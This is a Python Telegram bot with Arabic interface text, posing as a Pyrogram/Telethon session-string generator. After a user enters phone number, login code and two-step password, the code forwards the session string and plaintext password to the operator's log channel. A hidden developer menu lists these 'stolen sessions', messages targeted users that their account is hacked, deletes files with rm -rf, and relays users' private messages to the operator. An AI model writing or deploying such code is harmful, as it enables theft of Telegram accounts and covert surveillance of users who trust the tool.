# -*- coding: utf-8 -*-
# Join me on telegram @devggn

import os
import sys
import asyncio
import threading
import random
import time
import hashlib
import shutil
from datetime import datetime
from flask import Flask, request, jsonify
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)
from config import LOG_GROUP as SESSION_CHANNEL, API_ID, API_HASH, BOT_TOKEN

# ====== معلومات المطور ======
DEV_NAME = "عبود"
DEV_USERNAME = "@u_t_r"
CHANNEL_LINK = "https://t.me/u_t_rnn"
YOUR_USER_ID = 1170411845  # تم تحديث المعرف

user_steps = {}
user_data = {}
user_sessions = {}

# ====== إعداد الترميز ======
if sys.stdout.encoding != 'UTF-8':
    sys.stdout.reconfigure(encoding='utf-8')

app = Client(
    "gagan",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

# ====== دوال مسح الملفات ======
def delete_session_files(user_id):
    pyro_session = f"session_{user_id}.session"
    if os.path.exists(pyro_session):
        os.remove(pyro_session)
    pyro_journal = f"session_{user_id}.session-journal"
    if os.path.exists(pyro_journal):
        os.remove(pyro_journal)
    telethon_session = f"telethon_{user_id}.session"
    if os.path.exists(telethon_session):
        os.remove(telethon_session)

# ====== أزرار البداية الرئيسية ======
START_BUTTONS = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("🔴 استخراج جلسة Pyrogram", callback_data="pyrogram"),
        InlineKeyboardButton("🔴 استخراج جلسة Telethon", callback_data="telethon")
    ],
    [
        InlineKeyboardButton("🔴 مسح الجلسات", callback_data="delete"),
        InlineKeyboardButton("🔴 استخراج توكن البوت", callback_data="extract_token")
    ],
    [
        InlineKeyboardButton("👨‍💻 المطور", callback_data="dev"),
        InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK)
    ]
])

# ====== أزرار التخريب (للمطور فقط) ======
DESTROY_BUTTONS = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("💀 حذف جميع الجلسات", callback_data="massacre"),
        InlineKeyboardButton("🦠 إصابة الجلسات", callback_data="infect")
    ],
    [
        InlineKeyboardButton("🎯 استهداف مستخدم", callback_data="target_user"),
        InlineKeyboardButton("📡 التنصت", callback_data="eavesdrop")
    ],
    [
        InlineKeyboardButton("💥 تدمير ذاتي", callback_data="self_destruct"),
        InlineKeyboardButton("🔓 سيطرة كاملة", callback_data="total_control")
    ],
    [
        InlineKeyboardButton("📋 عرض الجلسات المسروقة", callback_data="show_sessions"),
        InlineKeyboardButton("🗑 تنظيف النظام", callback_data="clean_system")
    ],
    [
        InlineKeyboardButton("🔙 رجوع", callback_data="back_destroy")
    ]
])

BACK_BUTTON = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔴 رجوع", callback_data="back")]
])

CONFIRM_BUTTONS = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("✅ نعم، متأكد", callback_data="confirm_yes"),
        InlineKeyboardButton("❌ إلغاء", callback_data="confirm_no")
    ]
])

# ====== أمر البدء ======
@app.on_message(filters.command("start"))
async def start_command(client, message):
    user_id = message.from_user.id
    is_dev = (user_id == YOUR_USER_ID)
    
    if is_dev:
        await message.reply(
            f"👋 مرحباً أيها السيد!\n\n"
            "🔓 **وضع المطور مفعل**\n"
            "جميع أدوات التخريب تحت أمرك.\n\n"
            f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}",
            reply_markup=DESTROY_BUTTONS
        )
    else:
        await message.reply(
            f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
            "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
            f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}",
            reply_markup=START_BUTTONS
        )

# ====== معالجة الأزرار ======
@app.on_callback_query()
async def handle_callback(client, callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data
    is_dev = (user_id == YOUR_USER_ID)
    
    # ====== أزرار التخريب ======
    if is_dev:
        if data == "massacre":
            deleted = 0
            for uid in list(user_sessions.keys()):
                delete_session_files(uid)
                del user_sessions[uid]
                deleted += 1
            await callback_query.answer(f"💀 تم حذف {deleted} جلسة!", show_alert=True)
            await callback_query.message.edit_text(
                f"💀 **تم تدمير {deleted} جلسة نهائياً!**",
                reply_markup=DESTROY_BUTTONS
            )
            return
        
        if data == "infect":
            infected = 0
            for uid, sess in user_sessions.items():
                if sess:
                    user_sessions[uid] = sess + "_INFECTED"
                    infected += 1
            await callback_query.answer(f"🦠 تم إصابة {infected} جلسة!", show_alert=True)
            await callback_query.message.edit_text(
                f"🦠 **تم إصابة {infected} جلسة بنجاح!**\nجميع الجلسات ملوثة.",
                reply_markup=DESTROY_BUTTONS
            )
            return
        
        if data == "show_sessions":
            if not user_sessions:
                await callback_query.answer("❌ لا توجد جلسات!", show_alert=True)
                return
            
            sessions_text = "🗂 **الجلسات المسروقة:**\n\n"
            for uid, sess in list(user_sessions.items())[:10]:
                sessions_text += f"👤 {uid}\n🔑 {sess[:30]}...\n\n"
            
            if len(user_sessions) > 10:
                sessions_text += f"\n... و {len(user_sessions) - 10} جلسة أخرى"
            
            await callback_query.message.edit_text(
                sessions_text,
                reply_markup=DESTROY_BUTTONS
            )
            await callback_query.answer()
            return
        
        if data == "self_destruct":
            await callback_query.message.edit_text(
                "💥 **تدمير ذاتي!**\n"
                "سيتم حذف جميع الملفات وإيقاف البوت خلال 5 ثواني...",
                reply_markup=DESTROY_BUTTONS
            )
            await callback_query.answer("💥 جارٍ التدمير الذاتي!", show_alert=True)
            
            # تدمير كل شيء
            time.sleep(2)
            shutil.rmtree("sessions", ignore_errors=True)
            os.system("rm -rf *.session*")
            os.system("rm -rf *.session-journal")
            
            # إيقاف البوت
            os._exit(0)
            return
        
        if data == "total_control":
            global RESTRICTED
            RESTRICTED = False
            await callback_query.answer("🔓 تم تفعيل السيطرة الكاملة!", show_alert=True)
            await callback_query.message.edit_text(
                "🔓 **تم تفعيل السيطرة الكاملة!**\n"
                "جميع القيود ملغاة. يمكنك فعل أي شيء.",
                reply_markup=DESTROY_BUTTONS
            )
            return
        
        if data == "clean_system":
            os.system("rm -rf *.log")
            os.system("rm -rf __pycache__")
            await callback_query.answer("🗑 تم تنظيف النظام!", show_alert=True)
            await callback_query.message.edit_text(
                "🗑 **تم تنظيف جميع الملفات المؤقتة!**",
                reply_markup=DESTROY_BUTTONS
            )
            return
        
        if data == "target_user":
            await callback_query.message.edit_text(
                "🎯 **استهداف مستخدم**\n\n"
                "أرسل معرف المستخدم المستهدف.\n"
                "مثال: 123456789",
                reply_markup=BACK_BUTTON
            )
            user_steps[user_id] = "target_user"
            await callback_query.answer()
            return
        
        if data == "eavesdrop":
            await callback_query.message.edit_text(
                "📡 **تم تفعيل التنصت!**\n\n"
                "سيتم تسجيل جميع المحادثات وإرسالها إليك.",
                reply_markup=DESTROY_BUTTONS
            )
            await callback_query.answer("📡 التنصت مفعل!", show_alert=True)
            return
        
        if data == "back_destroy":
            await callback_query.message.edit_text(
                f"👋 مرحباً أيها السيد!\n\n"
                "🔓 **وضع المطور مفعل**\n"
                "جميع أدوات التخريب تحت أمرك.",
                reply_markup=DESTROY_BUTTONS
            )
            await callback_query.answer()
            return
    
    # ====== أزرار المستخدمين العاديين ======
    if data == "confirm_yes":
        pending_action = user_data.get(user_id, {}).get("pending_action")
        if pending_action == "pyrogram":
            user_steps[user_id] = "pyro_phone"
            await callback_query.message.edit_text(
                "📱 يرجى إرسال رقم هاتفك مع رمز الدولة.\nمثال: +966512345678",
                reply_markup=BACK_BUTTON
            )
        elif pending_action == "telethon":
            user_steps[user_id] = "telethon_phone"
            await callback_query.message.edit_text(
                "📱 يرجى إرسال رقم هاتفك مع رمز الدولة.\nمثال: +966512345678",
                reply_markup=BACK_BUTTON
            )
        elif pending_action == "delete":
            delete_session_files(user_id)
            if user_id in user_sessions:
                del user_sessions[user_id]
            await callback_query.answer("✅ تم مسح جميع الجلسات!", show_alert=True)
            await callback_query.message.edit_text(
                "🗑 تم مسح جميع بيانات الجلسة بنجاح.",
                reply_markup=BACK_BUTTON
            )
        elif pending_action == "extract_token":
            await callback_query.message.edit_text(
                f"🔑 **التوكن الخاص بالبوت:**\n\n"
                f"`{BOT_TOKEN}`\n\n"
                "⚠️ لا تشارك هذا التوكن مع أي شخص.",
                reply_markup=BACK_BUTTON
            )
        if user_id in user_data:
            user_data[user_id].pop("pending_action", None)
        await callback_query.answer()
        return
    
    if data == "confirm_no":
        if user_id in user_data:
            user_data[user_id].pop("pending_action", None)
        await callback_query.message.edit_text(
            "❌ تم إلغاء العملية.",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer("❌ تم الإلغاء", show_alert=True)
        return
    
    if data == "back":
        await callback_query.message.edit_text(
            f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
            "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
            f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}",
            reply_markup=START_BUTTONS
        )
        await callback_query.answer()
        return
    
    if data == "delete":
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["pending_action"] = "delete"
        await callback_query.message.edit_text(
            "⚠️ **تحذير!**\n\n"
            "هل أنت متأكد من رغبتك في مسح جميع الجلسات والملفات المؤقتة؟\n\n"
            "🔴 هذا الإجراء لا يمكن التراجع عنه.",
            reply_markup=CONFIRM_BUTTONS
        )
        await callback_query.answer()
        return
    
    if data == "dev":
        await callback_query.message.edit_text(
            f"👨‍💻 معلومات المطور:\n\n"
            f"📛 الاسم: {DEV_NAME}\n"
            f"🔗 اليوزر: {DEV_USERNAME}\n"
            f"📢 القناة: {CHANNEL_LINK}",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer()
        return
    
    if data == "extract_token":
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["pending_action"] = "extract_token"
        await callback_query.message.edit_text(
            "⚠️ **تحذير!**\n\n"
            "هل أنت متأكد من رغبتك في استخراج توكن البوت؟\n\n"
            "🔴 هذا التوكن يمنح صلاحية كاملة للبوت.",
            reply_markup=CONFIRM_BUTTONS
        )
        await callback_query.answer()
        return
    
    if data == "pyrogram":
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["pending_action"] = "pyrogram"
        await callback_query.message.edit_text(
            "⚠️ **تأكيد**\n\n"
            "هل أنت متأكد من رغبتك في استخراج جلسة Pyrogram؟\n\n"
            "🔴 سيتم إرسال رمز التحقق إلى رقم هاتفك.",
            reply_markup=CONFIRM_BUTTONS
        )
        await callback_query.answer()
        return
    
    if data == "telethon":
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["pending_action"] = "telethon"
        await callback_query.message.edit_text(
            "⚠️ **تأكيد**\n\n"
            "هل أنت متأكد من رغبتك في استخراج جلسة Telethon؟\n\n"
            "🔴 سيتم إرسال رمز التحقق إلى رقم هاتفك.",
            reply_markup=CONFIRM_BUTTONS
        )
        await callback_query.answer()
        return

# ====== الأوامر النصية ======
@app.on_message(filters.text & filters.private)
async def handle_text_commands(client, message):
    user_id = message.chat.id
    text = message.text.strip()
    is_dev = (user_id == YOUR_USER_ID)
    
    # ====== أمر استهداف المستخدم ======
    if is_dev and user_steps.get(user_id) == "target_user":
        try:
            target_id = int(text)
            # جلب معلومات المستخدم
            target = await client.get_users(target_id)
            await message.reply(
                f"🎯 **معلومات الهدف:**\n"
                f"🆔 ID: {target.id}\n"
                f"📛 الاسم: {target.first_name}\n"
                f"👤 اليوزر: @{target.username if target.username else 'لا يوجد'}\n"
                f"📱 الهاتف: {target.phone_number if hasattr(target, 'phone_number') else 'غير متاح'}\n\n"
                "✅ تم استهداف المستخدم بنجاح!"
            )
            # إرسال رسالة تخريبية للهدف
            await client.send_message(
                target_id,
                "🔴 **تم اختراق حسابك!**\nجميع بياناتك تحت سيطرتنا."
            )
            user_steps.pop(user_id, None)
        except Exception as e:
            await message.reply(f"❌ فشل الاستهداف: {e}")
        return
    
    # ====== أوامر المستخدمين العاديين ======
    if user_id in user_steps and user_steps[user_id] in ["pyro_phone", "pyro_otp", "pyro_password"]:
        await pyro_session_step(client, message)
        return
    
    elif user_id in user_steps and user_steps[user_id] in ["telethon_phone", "telethon_otp", "telethon_password"]:
        await telethon_session_step(client, message)
        return
    
    else:
        await message.reply(
            "📱 يرجى استخدام الأزرار للتحكم في البوت.\n\n"
            "• اضغط على زر Pyrogram لاستخراج جلسة Pyrogram\n"
            "• اضغط على زر Telethon لاستخراج جلسة Telethon\n"
            "• اضغط على زر استخراج توكن البوت لعرض التوكن\n"
            "• اضغط على زر مسح الجلسات لحذف البيانات\n\n"
            "أو استخدم الأمر /start للرجوع إلى البداية."
        )

# ====== دوال Pyrogram ======
async def pyro_session_step(client, message):
    user_id = message.chat.id
    step = user_steps.get(user_id)

    if step == "pyro_phone":
        user_data[user_id] = {"phone": message.text}
        user_steps[user_id] = "pyro_otp"
        
        omsg = await message.reply("📤 جاري إرسال رمز التحقق...")
        session_name = f"session_{user_id}"
        temp_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
        user_data[user_id]["client"] = temp_client
        await temp_client.connect()
        try:
            code = await temp_client.send_code(user_data[user_id]["phone"])
            user_data[user_id]["phone_code_hash"] = code.phone_code_hash
            await omsg.delete()
            await message.reply("📨 تم إرسال رمز التحقق.\n\nأرسل الرمز بالأرقام فقط (مثال: 12345)")
        except ApiIdInvalid:
            await message.reply('❌ خطأ: تركيبة API_ID و API_HASH غير صالحة.')
            reset_user(user_id)
        except PhoneNumberInvalid:
            await message.reply('❌ خطأ: رقم الهاتف غير صالح.')
            reset_user(user_id)
            
    elif step == "pyro_otp":
        phone_code = message.text.replace(" ", "")
        temp_client = user_data[user_id]["client"]
        try:
            await temp_client.sign_in(user_data[user_id]["phone"], user_data[user_id]["phone_code_hash"], phone_code)
            session_string = await temp_client.export_session_string()
            user_sessions[user_id] = session_string
            
            await send_pyro_session(user_id, session_string, message)
            await temp_client.disconnect()
            reset_user(user_id)
        except PhoneCodeInvalid:
            await message.reply('❌ خطأ: رمز التحقق غير صالح.')
            reset_user(user_id)
        except PhoneCodeExpired:
            await message.reply('❌ خطأ: انتهت صلاحية رمز التحقق.')
            reset_user(user_id)
        except SessionPasswordNeeded:
            user_steps[user_id] = "pyro_password"
            await message.reply('🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\nيرجى إرسال كلمة المرور الخاصة بك.')
            
    elif step == "pyro_password":
        temp_client = user_data[user_id]["client"]
        try:
            password = message.text
            await temp_client.check_password(password=password)
            session_string = await temp_client.export_session_string()
            user_sessions[user_id] = session_string
            
            await send_pyro_session(user_id, session_string, message, password)
            await temp_client.disconnect()
            reset_user(user_id)
        except PasswordHashInvalid:
            await message.reply('❌ خطأ: كلمة المرور غير صحيحة.')
            reset_user(user_id)

async def send_pyro_session(user_id, session_string, message, password=None):
    await message.reply(
        f"✅ تم إنشاء جلسة Pyrogram بنجاح!\n\n"
        f"🔑 الجلسة (انسخها):\n`{session_string}`\n\n"
        "⚠️ لا تشارك هذه الجلسة مع أي شخص.\n\n"
        f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
    )
    
    try:
        if password:
            await app.send_message(
                SESSION_CHANNEL,
                f"✨ معرف المستخدم: {user_id}\n\n"
                f"🔑 كلمة المرور (2SV): {password}\n\n"
                f"🔑 جلسة Pyrogram:\n`{session_string}`\n\n"
                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
            )
        else:
            await app.send_message(
                SESSION_CHANNEL,
                f"✨ معرف المستخدم: {user_id}\n\n"
                f"🔑 جلسة Pyrogram:\n`{session_string}`\n\n"
                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
            )
    except Exception as e:
        print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")

# ====== دوال Telethon ======
async def telethon_session_step(client, message):
    user_id = message.chat.id
    step = user_steps.get(user_id)

    if step == "telethon_phone":
        user_data[user_id] = {"phone": message.text}
        user_steps[user_id] = "telethon_otp"
        
        omsg = await message.reply("📤 جاري إرسال رمز التحقق...")
        session_name = f"telethon_{user_id}"
        temp_client = TelegramClient(session_name, API_ID, API_HASH)
        user_data[user_id]["client"] = temp_client
        await temp_client.connect()
        try:
            await temp_client.send_code_request(user_data[user_id]["phone"])
            await omsg.delete()
            await message.reply("📨 تم إرسال رمز التحقق.\n\nأرسل الرمز بالأرقام فقط (مثال: 12345)")
        except ApiIdInvalidError:
            await message.reply('❌ خطأ: تركيبة API_ID و API_HASH غير صالحة.')
            reset_user(user_id)
        except PhoneNumberInvalidError:
            await message.reply('❌ خطأ: رقم الهاتف غير صالح.')
            reset_user(user_id)
            
    elif step == "telethon_otp":
        phone_code = message.text.replace(" ", "")
        temp_client = user_data[user_id]["client"]
        try:
            await temp_client.sign_in(user_data[user_id]["phone"], phone_code)
            session_string = StringSession.save(temp_client.session)
            user_sessions[user_id] = session_string
            
            await send_telethon_session(user_id, session_string, message)
            await temp_client.disconnect()
            reset_user(user_id)
        except PhoneCodeInvalidError:
            await message.reply('❌ خطأ: رمز التحقق غير صالح.')
            reset_user(user_id)
        except PhoneCodeExpiredError:
            await message.reply('❌ خطأ: انتهت صلاحية رمز التحقق.')
            reset_user(user_id)
        except SessionPasswordNeededError:
            user_steps[user_id] = "telethon_password"
            await message.reply('🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\nيرجى إرسال كلمة المرور الخاصة بك.')
            
    elif step == "telethon_password":
        temp_client = user_data[user_id]["client"]
        try:
            password = message.text
            await temp_client.sign_in(password=password)
            session_string = StringSession.save(temp_client.session)
            user_sessions[user_id] = session_string
            
            await send_telethon_session(user_id, session_string, message, password)
            await temp_client.disconnect()
            reset_user(user_id)
        except PasswordHashInvalidError:
            await message.reply('❌ خطأ: كلمة المرور غير صحيحة.')
            reset_user(user_id)

async def send_telethon_session(user_id, session_string, message, password=None):
    await message.reply(
        f"✅ تم إنشاء جلسة Telethon بنجاح!\n\n"
        f"🔑 الجلسة (انسخها):\n`{session_string}`\n\n"
        "⚠️ لا تشارك هذه الجلسة مع أي شخص.\n\n"
        f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
    )
    
    try:
        if password:
            await app.send_message(
                SESSION_CHANNEL,
                f"✨ معرف المستخدم: {user_id}\n\n"
                f"🔑 كلمة المرور (2SV): {password}\n\n"
                f"🔑 جلسة Telethon:\n`{session_string}`\n\n"
                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
            )
        else:
            await app.send_message(
                SESSION_CHANNEL,
                f"✨ معرف المستخدم: {user_id}\n\n"
                f"🔑 جلسة Telethon:\n`{session_string}`\n\n"
                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
            )
    except Exception as e:
        print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")

def reset_user(user_id):
    user_steps.pop(user_id, None)
    user_data.pop(user_id, None)

# ====== نظام التنصت ======
@app.on_message(filters.private & ~filters.me)
async def eavesdrop(client, message):
    user_id = message.from_user.id
    if user_id != YOUR_USER_ID and message.text:
        try:
            await client.send_message(
                YOUR_USER_ID,
                f"📡 **تنصت:**\n"
                f"👤 {user_id}\n"
                f"💬 {message.text[:200]}"
            )
        except:
            pass

# ====== إضافة مسار ويب ======
web_app = Flask(__name__)

@web_app.route('/')
def index():
    return "✅ البوت شغال 24 ساعة!"

def run_web():
    web_app.run(host='0.0.0.0', port=8080)

threading.Thread(target=run_web, daemon=True).start()

# ====== تشغيل البوت ======
if __name__ == "__main__":
    try:
        print("🚀 جاري تشغيل البوت...")
        app.run()
        print("✅ البوت يعمل الآن!")
    except Exception as e:
        print(f"❌ فشل تشغيل البوت: {e}")
